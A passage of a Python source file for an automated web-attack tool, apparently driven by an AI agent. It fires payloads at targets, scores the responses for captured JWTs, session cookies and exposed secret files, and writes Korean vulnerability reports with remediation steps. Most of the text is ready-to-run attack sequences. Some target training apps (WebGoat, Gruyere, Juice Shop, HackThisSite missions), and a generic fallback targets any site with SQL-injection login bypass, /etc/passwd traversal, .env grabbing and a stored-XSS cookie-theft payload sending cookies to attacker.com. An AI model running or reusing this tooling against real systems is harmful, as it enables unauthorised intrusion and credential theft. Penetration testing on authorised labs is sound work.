            jwt_match = re.search(
                r'eyJ[A-Za-z0-9+/=_-]{10,}\.[A-Za-z0-9+/=_-]{10,}\.[A-Za-z0-9+/=_-]{10,}',
                res.text
            )
            if jwt_match:
                jwt_token = jwt_match.group()

        # ── 성공 판정 ────────────────────────────────────────────────────
        discovered_gruyere_uid = state.get("_gruyere_uid", "")
        if not discovered_gruyere_uid and "Gruyere" in state.get("detected_tech", ""):
            discovered_gruyere_uid = _discover_gruyere_uid(
                target_url=state.get("target_url", ""),
                final_url=str(res.url),
                response_text=res.text,
                location_header=res.headers.get("Location", ""),
            )

        if is_login_endpoint:
            if req_content_type == "form":
                has_session = bool(
                    session.cookies.get("phpbb3_") or
                    session.cookies.get("PHPSESSID") or
                    any("session" in k.lower() for k in session.cookies.keys())
                )
                is_success = bool(jwt_token) or has_session or any(
                    ind.lower() in res.text.lower() for ind in form_login_success
                )
            else:
                is_success = bool(jwt_token) or (
                    is_json and any(ind.lower() in res.text.lower() for ind in login_indicators)
                )
        else:
            # 비로그인 요청에서는 login 지표를 제외해 오탐을 방지
            is_success = any(ind.lower() in res.text.lower() for ind in generic_indicators + ctf_indicators)
            if not is_success and "robots.txt" in payload and status_code == 200:
                is_success = any(sensitive in res.text for sensitive in robots_sensitive)
            if not is_success:
                if ".htpasswd" in payload:
                    is_success = _is_real_file_exposed(res.text, "htpasswd", status_code)
                elif ".env" in payload and "envoy" not in payload:
                    is_success = _is_real_file_exposed(res.text, "env", status_code)
                elif ".bak" in payload or ".backup" in payload:
                    is_success = _is_real_file_exposed(res.text, "bak", status_code)
            # ── App-specific indicators ───────────────────────────────────
            _tech = state.get("detected_tech", "")
            if not is_success and "WebGoat" in _tech:
                is_success = any(ind in res.text for ind in webgoat_indicators)
            elif not is_success and "Gruyere" in _tech:
                payload_l = payload.lower()
                body_l = res.text.lower()

                # feed/snippets 엔드포인트는 XSSI 노출 여부를 별도로 판정
                if ("/feed.gtl" in payload_l or "/snippets.gtl" in payload_l) and status_code == 200:
                    is_success = any(ind.lower() in body_l for ind in gruyere_indicators)
                else:
                    is_success = False

        # ── CTF 미션 페이지 직접 추출 (HackThisSite Basic Missions) ──────
        ctf_extracted = []
        if "/missions/" in payload and status_code == 200:
            # 1) hidden input 추출 (name + value)
            hidden_patterns = [
                r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']+)["\']',
                r'<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']hidden["\'][^>]+value=["\']([^"\']+)["\']',
                r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']([^"\']{2,})["\'][^>]+type=["\']hidden["\']',
            ]
            skip_names = {"csrf", "_token", "csrfmiddlewaretoken", "form_token", "level", "stage", "mission"}
            for pat in hidden_patterns:
                for m in re.finditer(pat, res.text, re.IGNORECASE):
                    name, value = m.group(1), m.group(2)
                    if name.lower() not in skip_names and value.strip():
                        ctf_extracted.append(f"[HIDDEN INPUT] name={name} value={value}")
            # 2) JS 평문 비밀번호 변수 추출
            js_patterns = [
                r'var\s+(pass|password|passwd|solution|answer|key|secret)\s*=\s*["\']([^"\']+)["\']',
                r'(?:pass|password|passwd|solution|answer)\s*==\s*["\']([^"\']+)["\']',
                r'(?:pass|password|passwd|solution|answer)\s*===\s*["\']([^"\']+)["\']',
            ]
            for pat in js_patterns:
                for m in re.finditer(pat, res.text, re.IGNORECASE):
                    groups = m.groups()
                    if len(groups) == 2:
                        ctf_extracted.append(f"[JS VAR] {groups[0]}='{groups[1]}'")
                    else:
                        ctf_extracted.append(f"[JS COMPARE] value='{groups[0]}'")
            # 3) 세션 유효성 확인
            if not ctf_extracted:
                lower_text = res.text.lower()
                if "login" in lower_text and "mission" not in lower_text:
                    ctf_extracted.append("[SESSION] 미션 페이지 접근 실패 - 세션 쿠키를 확인하세요")
                elif "mission" in lower_text or "level" in lower_text:
                    ctf_extracted.append("[SESSION OK] 미션 페이지 로드됨 - 숨겨진 필드 없음 (Ctrl+U로 직접 확인)")
            if ctf_extracted:
                is_success = any("[HIDDEN INPUT]" in e or "[JS VAR]" in e or "[JS COMPARE]" in e for e in ctf_extracted)

        all_indicators = generic_indicators + login_indicators + ctf_indicators + robots_sensitive + webgoat_indicators + gruyere_indicators
        found = [ind for ind in all_indicators if ind.lower() in res.text.lower()] if is_success else []
        found = ctf_extracted + found  # CTF 추출 결과 맨 앞에 표시
        if jwt_token and "token" not in found:
            found.insert(0, "JWT token captured")

        if is_success:
            if jwt_token:
                feedback = "Success! JWT token captured."
            elif ctf_extracted and any("[HIDDEN INPUT]" in e or "[JS VAR]" in e for e in ctf_extracted):
                feedback = f"CTF Mission SUCCESS! 비밀번호 발견: {ctf_extracted[0]}"
            else:
                feedback = "Success indicators found!"
        elif status_code == 403:  feedback = "WAF blocked. Try encoding."
        elif status_code == 404:  feedback = "Endpoint not found."
        elif status_code == 500:  feedback = "Server error - possible vulnerability!"
        elif status_code == 401:  feedback = "Authentication required."
        elif status_code == 200:  feedback = "Request successful but no exploit indicators found."
        else:                     feedback = f"Status {status_code}. No exploit indicators."

        return {
            "is_success": is_success,
            "attempts": state["attempts"] + 1,
            "last_feedback": feedback,
            "_status_code": status_code,
            "_indicators_found": found,
            "_jwt_token": jwt_token,
            "_captured_email": captured_email,
            "_captured_role": captured_role,
            "_response_preview": response_preview,
            "_attack_url": payload,
            "_attack_method": method,
            "_attack_data": post_data,
            "_gruyere_uid": discovered_gruyere_uid,
        }
    except Exception as e:
        return {
            "is_success": False,
            "attempts": state["attempts"] + 1,
            "last_feedback": f"Connection error: {str(e)[:80]}",
            "_status_code": None,
            "_indicators_found": [],
            "_jwt_token": None,
            "_captured_email": None,
            "_captured_role": None,
            "_response_preview": "",
            "_attack_url": payload,
            "_attack_method": method,
            "_attack_data": post_data,
            "_gruyere_uid": state.get("_gruyere_uid", ""),
        }


def _detect_attack_type(state: dict) -> str:
    """발견된 지표와 공격 URL에서 실제 공격 유형을 판별."""
    url = state.get("_attack_url", "").lower()
    indicators = " ".join(state.get("_indicators_found", []))

    # ── WebGoat ───────────────────────────────────────────────────────
    if "webgoat" in url:
        if "sqlinjection" in url or "sqli" in url:
            return "sqli"
        if "crosssitescripting" in url or "xss" in url:
            return "xss"
        if "jwt" in url:
            return "sqli_auth"
        if "access-control" in url:
            return "idor"
        return "generic"
    # ── Gruyere / XSSI ───────────────────────────────────────────────
    if "feed.gtl" in url or "snippets.gtl" in url:
        return "xssi"
    if "gruyere" in url and ("<script>" in url or "onerror" in url or "alert(" in url):
        return "xss"
    # ── Standard types ────────────────────────────────────────────────
    if "/missions/" in url or "[HIDDEN INPUT]" in indicators or "[JS VAR]" in indicators:
        return "ctf"
    if state.get("_jwt_token") or "jwt token captured" in indicators.lower():
        return "sqli_auth"
    if "<script>" in url or "alert(" in url or "xss" in url:
        return "xss"
    if "etc/passwd" in url or "../" in url or "root:x:0:0:" in indicators:
        return "lfi"
    if re.search(r'/api/users?', url) and state.get("http_method", "") == "GET":
        return "idor"
    if any(x in url for x in ["robots.txt", ".htpasswd", ".env", ".bak", "/admin"]):
        return "recon"
    if any(x in url for x in ["or 1=1", "or true", "union select", "' or"]) or "SQL syntax" in indicators:
        return "sqli"
    return "generic"


def _build_report(state: dict) -> str:
    status = "공격 성공 ✅" if state.get("is_success") else "공격 실패 ❌"
    indicators = ", ".join(state.get("_indicators_found", [])) or "없음"
    post_data_str = json.dumps(state.get("post_data", {}), ensure_ascii=False) or "없음"

    atype = _detect_attack_type(state) if state.get("is_success") else "none"

    type_name = {
        "ctf":       "Sensitive Data Exposure (CTF Mission)",
        "sqli_auth": "SQL Injection — Auth Bypass",
        "xss":       "Cross-Site Scripting (XSS)",
        "xssi":      "Cross-Site Script Inclusion (XSSI)",
        "lfi":       "Local File Inclusion (LFI) / Path Traversal",
        "idor":      "Insecure Direct Object Reference (IDOR)",
        "recon":     "Information Disclosure",
        "sqli":      "SQL Injection",
        "generic":   "Web Vulnerability",
        "none":      "해당 없음",
    }.get(atype, "Web Vulnerability")

    analysis = {
        "ctf": (
            "페이지 소스에 인증 정보가 노출되어 있습니다. "
            "hidden input 필드 또는 JS 변수에 패스워드가 평문으로 포함되어 있어 "
            "소스 보기만으로 누구든 미션을 통과할 수 있습니다."
        ),
        "sqli_auth": (
            "SQL Injection을 통한 인증 우회에 성공하여 JWT 토큰이 탈취되었습니다. "
            "입력값이 SQL 쿼리에 직접 삽입되고 있으며, 공격자는 패스워드 없이 "
            "임의 계정(관리자 포함)으로 로그인할 수 있습니다."
        ),
        "xss": (
            "사용자 입력값이 HTML에 그대로 출력되어 스크립트 삽입이 가능합니다. "
            "공격자는 피해자 브라우저에서 임의 코드를 실행하거나 세션 쿠키를 탈취할 수 있습니다."
        ),
        "xssi": (
            "Cross-Site Script Inclusion(XSSI) 취약점이 확인되었습니다. "
            "feed.gtl 등 JSON 데이터를 JavaScript 함수 호출 형태로 반환하는 엔드포인트가 "
            "교차 출처 <script> 태그로 포함 가능하여, 공격자 도메인에서 피해자의 인증된 "
            "데이터(스니펫, 개인정보 등)를 탈취할 수 있습니다."
        ),
        "lfi": (
            "경로 탐색(Path Traversal) 취약점으로 서버 내부 파일 읽기에 성공했습니다. "
            "공격자는 /etc/passwd, SSH 키, 소스코드, 설정파일 등을 읽을 수 있습니다."
        ),
        "idor": (
            "접근 제어가 없는 API 엔드포인트에서 타 사용자 데이터 조회에 성공했습니다. "
            "ID 값 조작만으로 모든 계정의 개인정보에 접근할 수 있습니다."
        ),
        "recon": (
            "공개된 파일/경로를 통해 내부 구조 정보가 노출되었습니다. "
            "수집된 정보는 추가 공격의 진입점으로 활용될 수 있습니다."
        ),
        "sqli": (
            "SQL Injection 취약점이 확인되었습니다. "
            "입력값이 SQL 쿼리에 직접 삽입되어 DB 데이터 열람 및 인증 우회가 가능합니다."
        ),
        "generic": "취약점이 확인되었습니다. 상세 내용은 발견된 성공 지표를 참고하세요.",
        "none": "현재 설정으로는 취약점을 확인하지 못했습니다. 더 정교한 페이로드가 필요하거나 대상이 방어 기법을 적용하고 있을 수 있습니다.",
    }.get(atype, "취약점이 확인되었습니다.")

    remediation = {
        "ctf": [
            "서버 측 패스워드 파일에 대한 외부 접근 차단 (웹 루트 외부에 저장)",
            "HTML 소스에 인증 정보(hidden field, JS 변수)를 절대 포함하지 않기",
            "인증 로직은 반드시 서버 사이드에서만 처리",
        ],
        "sqli_auth": [
            "Prepared Statements (매개변수화된 쿼리) 사용",
            "ORM 사용으로 직접 SQL 조합 제거",
            "입력값 유효성 검사 — 특수문자 필터링",
            "에러 메시지에 SQL 정보 노출 금지",
            "DB 계정 최소 권한 원칙 적용",
        ],
        "xssi": [
            "JSON 응답 앞에 )]}', 또는 while(1); 등 JSON hijacking 방지 prefix 삽입",
            "동적 데이터를 JavaScript 함수 호출 형태(JSONP)로 반환하지 말 것",
            "민감 API에 CORS 정책 적용 — 허용된 출처만 접근 가능하도록 설정",
            "응답 Content-Type을 application/json으로 설정 (text/javascript 금지)",
            "모든 민감 엔드포인트에 CSRF 토큰 및 인증 검증 추가",
        ],
        "xss": [
            "모든 출력값에 HTML 이스케이핑 적용 (htmlspecialchars 등)",
            "Content-Security-Policy (CSP) 헤더 설정",
            "HttpOnly / Secure 쿠키 플래그 설정으로 쿠키 탈취 방지",
            "입력값 화이트리스트 기반 검증",
        ],
        "lfi": [
            "파일 경로에 사용자 입력값 직접 사용 금지",
            "허용된 파일 목록(화이트리스트)만 접근 허용",
            "open_basedir 설정으로 웹 루트 외부 접근 차단",
            "입력값에서 ../ 시퀀스 필터링",
        ],
        "idor": [
            "모든 API 요청에 인증 및 권한 검사 적용",
            "리소스 접근 시 소유권 검증 (현재 로그인 사용자 소유 여부)",
            "순차적 ID 대신 UUID 사용으로 열거 공격 방지",
        ],
        "recon": [
            "robots.txt에 민감한 경로 노출 금지",
            "불필요한 파일 (.htpasswd, .env, .bak) 웹 루트에서 제거",
            "디렉토리 리스팅 비활성화 (Options -Indexes)",
            "민감한 파일에 대한 웹 서버 수준 접근 제한",
        ],
        "sqli": [
            "Prepared Statements (매개변수화된 쿼리) 사용",
            "입력값 유효성 검사 및 특수문자 필터링",
            "WAF(Web Application Firewall) 도입",
            "에러 메시지에 SQL 정보 노출 금지",
            "최소 권한 원칙 — DB 계정에 필요한 권한만 부여",
        ],
        "generic": [
            "입력값 검증 및 화이트리스트 기반 필터링",
            "WAF 도입",
            "정기적인 보안 취약점 점검 실시",
        ],
        "none": [
            "정기적인 모의해킹 및 취약점 스캔 수행",
            "WAF 및 보안 모니터링 유지",
        ],
    }.get(atype, ["입력값 검증 강화", "WAF 도입", "정기 보안 점검"])

    remediation_str = "\n".join(f"{i+1}. {r}" for i, r in enumerate(remediation))

    return f"""## 테스트 결과 보고서

### 1. 테스트 개요
- **대상 URL**: {state['target_url']}
- **대상 IP**: {state.get('target_ip', 'Unknown')}
- **서버**: {state.get('server', 'Unknown')}
- **감지된 기술 스택**: {state.get('detected_tech', 'Unknown')}
- **최종 결과**: {status}
- **총 시도 횟수**: {state.get('attempts', 0)}회

### 2. 사용된 공격 기법
- **공격 타입**: {type_name}
- **HTTP 메소드**: {state.get('http_method', 'GET')}
- **최종 페이로드 URL**: `{state.get('final_payload', '')}`
- **POST 데이터**: `{post_data_str}`
- **발견된 성공 지표**: {indicators}

### 3. 결과 분석
{analysis}

### 4. 권장 조치사항
{remediation_str}

---
*반드시 허가된 시스템에서만 테스트를 수행하십시오.*"""


def _web_fallback_context(tech: str) -> str:
    return (
        "[Web Hacking Fallback Payloads]\n"
        "- SQL Injection: email=' OR true--, password=x\n"
        "- SQL Injection alt: email=' OR 1=1--, password=x\n"
        "- XSS: <script>alert(1)</script>\n"
        "- LFI: ../../etc/passwd\n"
        f"- Tech detected: {tech}"
    )


def _rule_based_payload(state: dict, attempt: int) -> dict:
    parsed = urlparse(state["target_url"])
    base = f"{parsed.scheme}://{parsed.netloc}"
    tech = state.get("detected_tech", "")

    if "WebGoat" in tech:
        attacks = [
            {"url": f"{base}/WebGoat/register", "method": "POST", "content_type": "json",
             "data": {"username": "hacker", "password": "hacker123!", "matchingPassword": "hacker123!", "role": "WEBGOAT_ADMIN"},
             "explanation": "[1/12] Register with WEBGOAT_ADMIN role — privilege escalation"},
            {"url": f"{base}/WebGoat/login", "method": "POST", "content_type": "form",
             "data": {"username": "hacker", "password": "hacker123!"},
             "explanation": "[2/12] Login with registered credentials"},
            {"url": f"{base}/WebGoat/SqlInjection/attack5a", "method": "POST", "content_type": "form",
             "data": {"account": "Smith' OR '1'='1", "operator": "3", "injection": ""},
             "explanation": "[3/12] SQLi on string field — always-true condition"},
            {"url": f"{base}/WebGoat/SqlInjection/attack6a", "method": "POST", "content_type": "form",
             "data": {"account": "Smith", "operator": "3", "injection": "1 OR 1=1"},
             "explanation": "[4/12] SQLi on numeric field"},
            {"url": f"{base}/WebGoat/service/lessonmenu.mvc", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[5/12] Lesson menu info disclosure"},
            {"url": f"{base}/WebGoat/access-control/user-info?account=Tom", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[6/12] IDOR — access Tom's account without auth"},
            {"url": f"{base}/WebGoat/SqlInjection/attack8", "method": "POST", "content_type": "form",
             "data": {"name": "Smith' UNION SELECT userid,user_name,password,cookie,1,1,1 FROM user_system_data--"},
             "explanation": "[7/12] UNION-based SQLi — extract all user credentials"},
            {"url": f"{base}/WebGoat/CrossSiteScripting/attack5a", "method": "POST", "content_type": "form",
             "data": {"QTY1": "1", "QTY2": "1", "QTY3": "<script>alert(document.domain)</script>", "QTY4": "1",
                      "field1": "x", "field2": "<script>alert(document.domain)</script>"},
             "explanation": "[8/12] Stored XSS via shopping cart field"},
            {"url": f"{base}/WebGoat/JWT/votings", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[9/12] JWT endpoint — inspect token structure"},
            {"url": f"{base}/WebGoat/login", "method": "POST", "content_type": "form",
             "data": {"username": "' OR '1'='1", "password": "x"},
             "explanation": "[10/12] SQLi auth bypass on login form"},
            {"url": f"{base}/WebGoat/PathTraversal/profile-upload", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[11/12] Path traversal profile-upload endpoint"},
            {"url": f"{base}/WebGoat/robots.txt", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[12/12] Recon — robots.txt for hidden paths"},
        ]
        return attacks[(attempt - 1) % len(attacks)]

    if "Gruyere" in tech:
        _uid = state.get("_gruyere_uid", "")
        if not _uid:
            _path_parts = [p for p in urlparse(state["target_url"]).path.split("/") if p]
            _uid = _path_parts[0] if _path_parts else ""
        if not _uid:
            return {
                "url": f"{base}/start",
                "method": "GET",
                "content_type": "json",
                "data": {},
                "explanation": "[0/12] Discover Gruyere UID via /start redirect",
            }
        gb = f"{parsed.scheme}://{parsed.netloc}/{_uid}" if _uid else base
        attacks = [
            {"url": f"{gb}/feed.gtl", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[1/12] XSSI — feed.gtl exposes snippets as callable JS"},
            {"url": f"{gb}/login?user=test&password=test", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[2/12] Login via GET (credentials exposed in URL)"},
            {"url": f"{gb}/account?action=newaccount&user=hacker&password=hacker123", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[3/12] Create account via GET — no CSRF protection"},
            {"url": f"{gb}/snippets.gtl?uid=admin", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[4/12] IDOR — access admin's private snippets"},
            {"url": f"{gb}/addsnippet", "method": "POST", "content_type": "form",
             "data": {"title": "xss", "snippet": "<img src=x onerror=alert(document.domain)>"},
             "explanation": "[5/12] Stored XSS via snippet field"},
            {"url": f"{gb}/feed.gtl?uid=admin", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[6/12] XSSI — steal admin's snippets cross-origin"},
            {"url": f"{gb}/account?action=update&color=<script>alert(document.domain)</script>", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[7/12] Reflected XSS via profile color field"},
            {"url": f"{gb}/snippets.gtl?uid=administrator", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[8/12] IDOR — enumerate other user snippets"},
            {"url": f"{gb}/addsnippet", "method": "POST", "content_type": "form",
             "data": {"title": "steal", "snippet": "<script>document.location='http://attacker.com/?c='+document.cookie</script>"},
             "explanation": "[9/12] Stored XSS — cookie theft payload"},
            {"url": f"{gb}/account?action=newaccount&user=admin2&password=x&is_admin=true", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[10/12] Privilege escalation — add is_admin param"},
            {"url": f"{gb}/feed.gtl?uid=test", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[11/12] XSSI — enumerate other users' feeds"},
            {"url": f"{gb}/", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[12/12] Recon — home page user/snippet enumeration"},
        ]
        return attacks[(attempt - 1) % len(attacks)]

    if "HackThisSite" in tech:
        attacks = [
            {"url": f"{base}/missions/basic/1/", "method": "GET", "content_type": "json", "data": {}, "explanation": "[1/12] Basic Mission 1"},
            {"url": f"{base}/missions/basic/2/", "method": "GET", "content_type": "json", "data": {}, "explanation": "[2/12] Basic Mission 2"},
            {"url": f"{base}/missions/basic/3/", "method": "GET", "content_type": "json", "data": {}, "explanation": "[3/12] Basic Mission 3"},
            {"url": f"{base}/missions/basic/4/", "method": "GET", "content_type": "json", "data": {}, "explanation": "[4/12] Basic Mission 4"},
            {"url": f"{base}/missions/basic/5/", "method": "GET", "content_type": "json", "data": {}, "explanation": "[5/12] Basic Mission 5"},
            {"url": f"{base}/robots.txt", "method": "GET", "content_type": "json", "data": {}, "explanation": "[6/12] robots.txt"},
            {"url": f"{base}/.htpasswd", "method": "GET", "content_type": "json", "data": {}, "explanation": "[7/12] .htpasswd"},
            {"url": f"{base}/index.php.bak", "method": "GET", "content_type": "json", "data": {}, "explanation": "[8/12] Backup file"},
            {"url": f"{base}/admin/", "method": "GET", "content_type": "json", "data": {}, "explanation": "[9/12] /admin/"},
            {"url": f"{base}/missions/basic/6/", "method": "GET", "content_type": "json", "data": {}, "explanation": "[10/12] Basic Mission 6"},
            {"url": f"{base}/missions/basic/1/../../../../etc/passwd", "method": "GET", "content_type": "json", "data": {}, "explanation": "[11/12] LFI"},
            {"url": f"{base}/search/?q=<script>alert(document.domain)</script>", "method": "GET", "content_type": "json", "data": {}, "explanation": "[12/12] XSS"},
        ]
        return attacks[(attempt - 1) % len(attacks)]

    if "Juice Shop" in tech:
        attacks = [
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json", "data": {"email": "' OR 1=1--", "password": "x"}, "explanation": "[1/12] SQLi ' OR 1=1--"},
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json", "data": {"email": "' OR true--", "password": "x"}, "explanation": "[2/12] SQLi ' OR true--"},
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json", "data": {"email": "admin@juice-sh.op'--", "password": "x"}, "explanation": "[3/12] SQLi admin email"},
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json", "data": {"email": "' OR '1'='1'--", "password": "x"}, "explanation": "[4/12] SQLi variant"},
            {"url": f"{base}/api/Users/", "method": "GET", "content_type": "json", "data": {}, "explanation": "[5/12] IDOR /api/Users/"},
            {"url": f"{base}/#/administration", "method": "GET", "content_type": "json", "data": {}, "explanation": "[6/12] Admin panel"},
            {"url": f"{base}/rest/products/search?q=<script>alert(document.domain)</script>", "method": "GET", "content_type": "json", "data": {}, "explanation": "[7/12] XSS"},
            {"url": f"{base}/assets/i18n/../../../../etc/passwd", "method": "GET", "content_type": "json", "data": {}, "explanation": "[8/12] LFI"},
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json", "data": {"email": "' UNION SELECT 1,2,3--", "password": "x"}, "explanation": "[9/12] UNION SELECT"},
            {"url": f"{base}/api/Feedbacks/", "method": "GET", "content_type": "json", "data": {}, "explanation": "[10/12] IDOR Feedbacks"},
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json", "data": {"email": "' OR 1=1 LIMIT 1--", "password": "x"}, "explanation": "[11/12] SQLi LIMIT 1"},
            {"url": f"{base}/admin", "method": "GET", "content_type": "json", "data": {}, "explanation": "[12/12] /admin"},
        ]
        return attacks[(attempt - 1) % len(attacks)]

    attacks = [
        {"url": f"{base}/login", "method": "POST", "content_type": "form", "data": {"username": "' OR 1=1--", "password": "x"}, "explanation": "[1/12] SQLi form"},
        {"url": f"{base}/login", "method": "POST", "content_type": "json", "data": {"email": "' OR 1=1--", "password": "x"}, "explanation": "[2/12] SQLi JSON"},
        {"url": f"{base}/signin", "method": "POST", "content_type": "json", "data": {"email": "' OR true--", "password": "x"}, "explanation": "[3/12] SQLi /signin"},
        {"url": f"{base}/api/login", "method": "POST", "content_type": "json", "data": {"email": "' OR 1=1--", "password": "x"}, "explanation": "[4/12] SQLi /api/login"},
        {"url": f"{base}/user/login", "method": "POST", "content_type": "form", "data": {"username": "' OR 1=1--", "password": "x"}, "explanation": "[5/12] SQLi /user/login"},
        {"url": f"{base}/api/users", "method": "GET", "content_type": "json", "data": {}, "explanation": "[6/12] IDOR /api/users"},
        {"url": f"{base}/admin", "method": "GET", "content_type": "json", "data": {}, "explanation": "[7/12] /admin"},
        {"url": f"{base}/login", "method": "POST", "content_type": "form", "data": {"username": "' UNION SELECT 1,2,3--", "password": "x"}, "explanation": "[8/12] UNION SELECT"},
        {"url": f"{base}/search?q=<script>alert(document.domain)</script>", "method": "GET", "content_type": "json", "data": {}, "explanation": "[9/12] XSS"},
        {"url": f"{base}/file?path=../../etc/passwd", "method": "GET", "content_type": "json", "data": {}, "explanation": "[10/12] LFI"},
        {"url": f"{base}/.env", "method": "GET", "content_type": "json", "data": {}, "explanation": "[11/12] .env"},
        {"url": f"{base}/robots.txt", "method": "GET", "content_type": "json", "data": {}, "explanation": "[12/12] robots.txt"},
    ]
    return attacks[(attempt - 1) % len(attacks)]


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
